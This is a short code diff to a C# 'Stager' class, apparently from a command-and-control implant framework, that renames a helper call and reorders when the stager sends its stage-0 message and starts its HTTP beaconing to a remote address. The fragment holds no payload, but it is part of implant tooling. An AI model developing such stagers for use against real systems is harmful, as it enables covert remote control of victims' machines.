@@ -37,7 +37,7 @@ namespace Stager
 
         public static void Execute()
         {
-            AgentID = Helpers.GetRandomString(6);
+            AgentID = Utilities.GetRandomString(6);
             Crypto = new Crypto();
 
             StagerModule = new StagerModule
@@ -64,11 +64,12 @@ namespace Stager
 
 
             CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
-            CommModule.Start();
+            
+            SendStage0();
 
             System.Threading.Thread.Sleep(30000);
 
-            SendStage0();
+            CommModule.Start();
 
             while (!Staged)
             {
